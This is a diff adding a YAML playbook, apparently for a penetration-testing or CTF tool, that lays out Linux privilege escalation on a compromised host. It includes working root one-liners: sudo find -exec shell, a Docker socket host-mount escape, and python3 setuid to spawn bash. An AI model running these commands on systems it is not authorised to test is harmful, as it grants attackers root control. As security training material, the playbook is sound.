@@ -1,0 +1,73 @@
+id: linux-privesc
+name: Linux Local Privilege Escalation
+category: privesc
+description: Comprehensive methodology for escalating privileges on compromised Linux machines. Covers sudo rights, SUID binaries, docker group socket escapes, capabilities, writable cron jobs, and unshadow.
+requires_shell: true
+target_os: linux
+port_triggers: []
+tags:
+  - linux
+  - privesc
+  - sudo
+  - suid
+  - docker
+  - capabilities
+steps:
+  - id: linux-sudo-check
+    title: Sudo Rights & NOPASSWD Checks
+    phase: enumeration
+    purpose: Inspect what commands the current user can execute as superuser (root) without password verification.
+    command: sudo -l
+    expected_output:
+      - 'User developer may run the following commands on target:'
+      - '    (ALL : ALL) NOPASSWD: /usr/bin/find'
+    common_mistakes:
+      - Not checking GTFOBins (https://gtfobins.github.io/) for allowed sudo binary bypasses.
+    if_success: 'Sudo command found! Look up binary on GTFOBins: `sudo find . -exec /bin/sh \; -quit` to get root.'
+    if_failure: Password required or no sudo rights. Proceed to SUID binary discovery.
+    references:
+      - https://gtfobins.github.io/
+      - https://book.hacktricks.xyz/linux-hardening/privilege-escalation
+  - id: linux-suid-bins
+    title: SUID & SGID Binaries Discovery
+    phase: enumeration
+    purpose: Find binaries with the SUID bit set that execute with the privileges of the file owner (root).
+    command: find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null
+    expected_output:
+      - '-rwsr-xr-x 1 root root  44120 Jan 15 2022 /usr/bin/passwd'
+      - '-rwsr-xr-x 1 root root 124312 May 10 2023 /usr/local/bin/custom_backup'
+    common_mistakes:
+      - Ignoring non-standard custom binaries in `/opt/`, `/tmp/`, or `/usr/local/bin/`.
+    if_success: Custom SUID found! Run `strings <binary>` or `ltrace <binary>` to inspect for unquoted path hijacking.
+    if_failure: Only standard SUID binaries found. Check capabilities and group memberships.
+    references:
+      - https://gtfobins.github.io/
+  - id: linux-docker-escape
+    title: Privilege Escalation via Docker Group / Socket
+    phase: exploitation
+    purpose: If current user belongs to "docker" group or has write access to `/var/run/docker.sock`, mount host root filesystem inside a container.
+    command: docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+    expected_output:
+      - '# whoami'
+      - root
+      - '# cat /root/root.txt'
+    common_mistakes:
+      - If alpine image is missing locally, run `docker images` to find any pre-installed container image.
+    if_success: Immediate root access achieved inside host root filesystem mount!
+    if_failure: User not in docker group. Check LXD or capabilities.
+    references:
+      - https://gtfobins.github.io/
+  - id: linux-caps-check
+    title: Linux Capabilities Inspection (getcap)
+    phase: enumeration
+    purpose: Inspect binaries with granted POSIX capabilities (e.g. `cap_setuid+ep`, `cap_dac_read_search+ep`).
+    command: getcap -r / 2>/dev/null
+    expected_output:
+      - /usr/bin/python3.8 = cap_setuid+ep
+      - /usr/bin/tar = cap_dac_read_search+ep
+    common_mistakes:
+      - Not checking GTFOBins Capabilities section for binary bypasses.
+    if_success: 'Exploitable capability found! E.g. python3: `/usr/bin/python3 -c "import os; os.setuid(0); os.system(''/bin/bash'')"` gives root.'
+    if_failure: No custom capabilities. Proceed to cron job and writable path inspection.
+    references:
+      - https://gtfobins.github.io/
